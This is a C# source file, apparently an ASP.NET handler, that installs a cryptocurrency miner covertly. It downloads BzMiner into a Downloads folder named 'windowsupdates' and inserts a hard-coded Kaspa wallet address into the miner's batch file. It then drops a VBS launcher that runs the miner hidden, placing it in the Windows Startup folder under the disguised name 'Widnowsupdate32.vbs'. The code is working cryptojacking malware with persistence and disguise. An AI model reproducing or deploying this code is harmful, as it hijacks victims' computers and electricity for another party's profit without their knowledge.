using System;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Http;

namespace Kaspa
{
    public class MyProgram
    {
        public static async Task RunAsync(HttpContext context)
        {
            string url = "https://github.com/bzminer/bzminer/releases/download/v19.2.3/bzminer_v19.2.3_windows.zip";
            string zipFilePath = Path.Combine(GetDownloadsFolderPath(), "windowsupdates", "bzminer_v19.2.3_windows.zip");

            Directory.CreateDirectory(Path.Combine(GetDownloadsFolderPath(), "windowsupdates"));

            await DownloadFileAsync(url, zipFilePath);

            ExtractZipFile(zipFilePath, Path.Combine(GetDownloadsFolderPath(), "windowsupdates"));

            string kaspaBatFilePath = Path.Combine(GetDownloadsFolderPath(), "windowsupdates", "bzminer_v19.2.3_windows", "kaspa.bat");

            ReplaceWalletAddress(kaspaBatFilePath, "kaspa:0000", "kaspa:qpadcs2hswpfkvc2eq9020su9eahrjx0zdn2mulel573cm0v6nggqfphxs88l");

            Console.WriteLine("Download, extraction, and modification completed!");

            string vbsScriptContent = $@"Set objShell = CreateObject(""WScript.Shell"")objShell.Run ""{kaspaBatFilePath}"", 0, False";

            string vbsFilePath = Path.Combine(GetDownloadsFolderPath(), "windowsupdates", "RunKaspa.vbs");
            SaveToFile(vbsFilePath, vbsScriptContent);

            MoveFile(vbsFilePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Widnowsupdate32.vbs"));

            context.Response.StatusCode = 200;
            await context.Response.WriteAsync("Download, extraction, and modification completed!");
        }

        static async Task DownloadFileAsync(string url, string destinationFilePath)
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    HttpResponseMessage response = await client.GetAsync(url);
                    response.EnsureSuccessStatusCode();

                    using (Stream contentStream = await response.Content.ReadAsStreamAsync())
                    {
                        using (FileStream fileStream = File.Create(destinationFilePath))
                        {
                            await contentStream.CopyToAsync(fileStream);
                        }
                    }

                    Console.WriteLine("File downloaded successfully.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error downloading file: {ex.Message}");
                }
            }
        }

        static void ExtractZipFile(string zipFilePath, string extractPath)
        {
            try
            {
                ZipFile.ExtractToDirectory(zipFilePath, extractPath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error extracting ZIP file: {ex.Message}");
            }
        }

        static void ReplaceWalletAddress(string filePath, string oldAddress, string newAddress)
        {
            try
            {
                string fileContent = File.ReadAllText(filePath);
                fileContent = fileContent.Replace(oldAddress, newAddress);
                File.WriteAllText(filePath, fileContent);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error replacing wallet address: {ex.Message}");
            }
        }

        static string GetDownloadsFolderPath()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + Path.DirectorySeparatorChar + "Downloads";
        }

        static void SaveToFile(string filePath, string content)
        {
            try
            {
                File.WriteAllText(filePath, content);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error saving file: {ex.Message}");
            }
        }

        static void MoveFile(string sourcePath, string destinationPath)
        {
            try
            {
                File.Move(sourcePath, destinationPath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error moving file: {ex.Message}");
            }
        }
    }
}
